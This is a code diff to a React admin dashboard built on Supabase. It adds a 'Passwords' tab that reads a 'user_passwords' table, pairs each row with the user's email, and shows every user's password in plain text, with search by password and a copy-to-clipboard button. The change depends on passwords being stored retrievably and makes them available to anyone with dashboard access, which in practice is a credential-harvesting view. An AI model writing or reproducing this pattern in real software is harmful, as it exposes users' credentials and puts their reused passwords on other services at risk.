@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { supabase } from '../lib/supabase';
-import { FileText, CheckCircle, AlertCircle, Clock, Download, X, Eye, Search } from 'lucide-react';
+import { FileText, CheckCircle, AlertCircle, Clock, Download, X, Eye, Search, Key, Copy, Check } from 'lucide-react';
 
 interface Screenshot {
   id: number;
@@ -12,24 +12,39 @@ interface Screenshot {
   created_at: string;
 }
 
+interface UserPassword {
+  id: string;
+  user_id: string;
+  password: string;
+  email: string;
+  created_at: string;
+}
+
 interface AdminDashboardProps {
   isOpen: boolean;
   onClose: () => void;
 }
 
 export default function AdminDashboard({ isOpen, onClose }: AdminDashboardProps) {
+  const [activeTab, setActiveTab] = useState<'screenshots' | 'passwords'>('screenshots');
   const [screenshots, setScreenshots] = useState<Screenshot[]>([]);
+  const [users, setUsers] = useState<UserPassword[]>([]);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [searchTerm, setSearchTerm] = useState('');
   const [statusFilter, setStatusFilter] = useState<string>('all');
   const [selectedScreenshot, setSelectedScreenshot] = useState<Screenshot | null>(null);
+  const [copiedId, setCopiedId] = useState<string | null>(null);
 
   useEffect(() => {
     if (isOpen) {
-      fetchScreenshots();
+      if (activeTab === 'screenshots') {
+        fetchScreenshots();
+      } else {
+        fetchUsers();
+      }
     }
-  }, [isOpen]);
+  }, [isOpen, activeTab]);
 
   const fetchScreenshots = async () => {
     setLoading(true);
@@ -123,13 +138,83 @@ export default function AdminDashboard({ isOpen, onClose }: AdminDashboardProps)
     });
   };
 
+  const fetchUsers = async () => {
+    setLoading(true);
+    setError(null);
+    try {
+      const { data, error: queryError } = await supabase
+        .from('user_passwords')
+        .select(`
+          id,
+          user_id,
+          password,
+          created_at,
+          users:user_id(email)
+        `)
+        .order('created_at', { ascending: false });
+
+      if (queryError) throw queryError;
+
+      const formattedData = data?.map(item => ({
+        id: item.id,
+        user_id: item.user_id,
+        password: item.password,
+        email: (item.users as any)?.email || 'Unknown',
+        created_at: item.created_at
+      })) || [];
+
+      setUsers(formattedData);
+    } catch (err) {
+      setError(err instanceof Error ? err.message : 'Failed to load user passwords');
+    } finally {
+      setLoading(false);
+    }
+  };
+
+  const copyToClipboard = (text: string, id: string) => {
+    navigator.clipboard.writeText(text);
+    setCopiedId(id);
+    setTimeout(() => setCopiedId(null), 2000);
+  };
+
+  const filteredUsers = users.filter(u =>
+    u.email.toLowerCase().includes(searchTerm.toLowerCase()) ||
+    u.password.toLowerCase().includes(searchTerm.toLowerCase())
+  );
+
   if (!isOpen) return null;
 
   return (
     <div className="fixed inset-0 bg-black/50 z-40 flex items-center justify-center p-4">
       <div className="bg-gray-800 rounded-lg border border-gray-700 w-full max-w-6xl max-h-[90vh] overflow-hidden flex flex-col">
         <div className="sticky top-0 bg-gray-800 border-b border-gray-700 p-6 flex justify-between items-center">
-          <h2 className="text-2xl font-bold text-green-400">Admin Dashboard - Screenshots</h2>
+          <div>
+            <h2 className="text-2xl font-bold text-green-400 mb-4">Admin Dashboard</h2>
+            <div className="flex gap-2">
+              <button
+                onClick={() => setActiveTab('screenshots')}
+                className={`px-4 py-2 rounded-lg font-medium transition-colors ${
+                  activeTab === 'screenshots'
+                    ? 'bg-green-600 text-white'
+                    : 'bg-gray-700 text-gray-300 hover:bg-gray-600'
+                }`}
+              >
+                <FileText className="w-4 h-4 inline mr-2" />
+                Screenshots
+              </button>
+              <button
+                onClick={() => setActiveTab('passwords')}
+                className={`px-4 py-2 rounded-lg font-medium transition-colors ${
+                  activeTab === 'passwords'
+                    ? 'bg-green-600 text-white'
+                    : 'bg-gray-700 text-gray-300 hover:bg-gray-600'
+                }`}
+              >
+                <Key className="w-4 h-4 inline mr-2" />
+                Passwords
+              </button>
+            </div>
+          </div>
           <button
             onClick={onClose}
             className="text-gray-400 hover:text-gray-300 transition-colors"
@@ -139,6 +224,7 @@ export default function AdminDashboard({ isOpen, onClose }: AdminDashboardProps)
         </div>
 
         <div className="flex flex-col lg:flex-row flex-1 overflow-hidden">
+          {activeTab === 'screenshots' ? (
           <div className="flex-1 flex flex-col overflow-hidden border-r border-gray-700">
             <div className="p-4 border-b border-gray-700 space-y-4">
               <div className="flex gap-2">
@@ -211,8 +297,69 @@ export default function AdminDashboard({ isOpen, onClose }: AdminDashboardProps)
               )}
             </div>
           </div>
+          ) : (
+          <div className="flex-1 flex flex-col overflow-hidden">
+            <div className="p-4 border-b border-gray-700 space-y-4">
+              <div className="flex-1 relative">
+                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500 w-4 h-4" />
+                <input
+                  type="text"
+                  placeholder="Search email or password..."
+                  value={searchTerm}
+                  onChange={(e) => setSearchTerm(e.target.value)}
+                  className="w-full pl-10 pr-4 py-2 bg-gray-700 border border-gray-600 text-gray-200 rounded-lg focus:ring-2 focus:ring-green-500 focus:border-transparent"
+                />
+              </div>
+              <div className="text-sm text-gray-400">
+                Total users: {users.length}
+              </div>
+            </div>
 
-          {selectedScreenshot && (
+            <div className="flex-1 overflow-y-auto">
+              {loading ? (
+                <div className="p-8 text-center text-green-400">Loading...</div>
+              ) : error ? (
+                <div className="p-8 text-center text-red-400">{error}</div>
+              ) : filteredUsers.length === 0 ? (
+                <div className="p-8 text-center text-gray-400">No users found</div>
+              ) : (
+                <div className="space-y-2 p-4">
+                  {filteredUsers.map((user) => (
+                    <div
+                      key={user.id}
+                      className="p-4 rounded-lg bg-gray-900 border border-gray-700 hover:border-green-500/50 transition-colors"
+                    >
+                      <div className="flex items-center justify-between mb-3">
+                        <div className="min-w-0 flex-1">
+                          <p className="font-medium text-gray-200 truncate">{user.email}</p>
+                          <p className="text-xs text-gray-500">{formatDate(user.created_at)}</p>
+                        </div>
+                      </div>
+                      <div className="flex items-center gap-2">
+                        <div className="flex-1 bg-gray-800 rounded px-3 py-2 border border-gray-700">
+                          <p className="text-gray-300 text-sm font-mono">{user.password}</p>
+                        </div>
+                        <button
+                          onClick={() => copyToClipboard(user.password, user.id)}
+                          className="p-2 bg-gray-700 hover:bg-gray-600 rounded transition-colors text-gray-300"
+                          title="Copy password"
+                        >
+                          {copiedId === user.id ? (
+                            <Check className="w-4 h-4 text-green-400" />
+                          ) : (
+                            <Copy className="w-4 h-4" />
+                          )}
+                        </button>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </div>
+          </div>
+          )}
+
+          {activeTab === 'screenshots' && selectedScreenshot && (
             <div className="w-full lg:w-96 bg-gray-900 border-l border-gray-700 overflow-y-auto">
               <div className="p-6 space-y-6">
                 <div>
